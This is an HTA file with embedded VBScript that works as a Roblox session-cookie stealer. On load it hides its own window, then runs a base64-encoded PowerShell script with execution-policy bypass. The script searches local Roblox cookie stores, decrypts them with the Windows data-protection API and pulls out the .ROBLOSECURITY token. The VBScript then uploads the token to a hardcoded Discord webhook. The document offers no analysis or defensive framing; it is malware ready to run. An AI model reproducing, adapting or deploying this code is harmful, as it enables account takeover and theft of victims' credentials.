<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH = "https://discord.com/api/webhooks/1557940328634392599/JB0LWj2uMiMYkGJoikIs-rRBHtcZWwHy125EHn3ecDLdrOBrb724VFvH1jpQTYzhuAzL"

Sub Window_OnLoad()
    window.resizeTo 0,0
    window.moveTo -2000,-2000
    GrabRoblox()
End Sub

Function B64Encode(s)
    Dim xml, node
    Set xml  = CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type    = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText s
    stream.Position = 0
    stream.Type = 1
    Dim bytes : bytes = stream.Read
    stream.Close
    node.nodeTypedValue = bytes
    B64Encode = Replace(Replace(node.text, vbCr, ""), vbLf, "")
End Function

Sub GrabRoblox()
    Dim tf, raw
    tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\rr.txt"
    If fso.FileExists(tf) Then fso.DeleteFile tf, True

    Dim ps : ps = _
        "Add-Type -AssemblyName System.Security" & vbLf & _
        "$cookie = $null" & vbLf & _
        "" & vbLf & _
        "function Clean-Cookie($raw) {" & vbLf & _
        "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]" & vbLf & _
        "    $i = $c.IndexOf('_|WARNING')" & vbLf & _
        "    if ($i -gt 0) { $c = $c.Substring($i) }" & vbLf & _
        "    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }" & vbLf & _
        "    return $null" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "foreach ($rp in @(" & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat')," & vbLf & _
        "    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies')," & vbLf & _
        "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')" & vbLf & _
        ")) {" & vbLf & _
        "    if ($cookie -or -not (Test-Path $rp)) { continue }" & vbLf & _
        "    try {" & vbLf & _
        "        $raw = [System.IO.File]::ReadAllText($rp)" & vbLf & _
        "        try {" & vbLf & _
        "            $j = $raw | ConvertFrom-Json" & vbLf & _
        "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {" & vbLf & _
        "                if ($cookie) { return }" & vbLf & _
        "                try {" & vbLf & _
        "                    $ek  = [Convert]::FromBase64String($_.Value)" & vbLf & _
        "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')" & vbLf & _
        "                    $str = [System.Text.Encoding]::UTF8.GetString($dec)" & vbLf & _
        "                    $c   = Clean-Cookie $str" & vbLf & _
        "                    if ($c) { $cookie = $c }" & vbLf & _
        "                } catch {}" & vbLf & _
        "            }" & vbLf & _
        "        } catch {}" & vbLf & _
        "        if (-not $cookie) { $cookie = Clean-Cookie $raw }" & vbLf & _
        "    } catch {}" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "if (-not $cookie) {" & vbLf & _
        "    $pkgs = Join-Path $env:LOCALAPPDATA 'Packages'" & vbLf & _
        "    if (Test-Path $pkgs) {" & vbLf & _
        "        Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {" & vbLf & _
        "            if ($cookie) { return }" & vbLf & _
        "            foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {" & vbLf & _
        "                $uwp = Join-Path $_.FullName $fn" & vbLf & _
        "                if (-not (Test-Path $uwp)) { continue }" & vbLf & _
        "                try {" & vbLf & _
        "                    $c = Clean-Cookie ([System.IO.File]::ReadAllText($uwp))" & vbLf & _
        "                    if ($c) { $cookie = $c; break }" & vbLf & _
        "                } catch {}" & vbLf & _
        "            }" & vbLf & _
        "        }" & vbLf & _
        "    }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "if ($cookie) { $cookie | Out-File '" & tf & "' -Encoding utf8 -NoNewline }" & vbLf & _
        "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"

    Dim enc : enc = B64Encode(ps)
    sh.Run "powershell -NoP -NonI -Exec Bypass -EncodedCommand " & enc, 0, True

    If Not fso.FileExists(tf) Then Exit Sub
    Dim f : Set f = fso.OpenTextFile(tf, 1) : raw = Trim(f.ReadAll) : f.Close : Set f = Nothing
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub

    PostFile "roblox_cookie.txt", raw
End Sub

Sub PostFile(fn, ct)
    Dim DQ, b, bd, h
    DQ = Chr(34)
    b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    bd = "--" & b & vbCrLf & _
         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
         ct & vbCrLf & "--" & b & "--"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

</script>
</head><body></body></html>
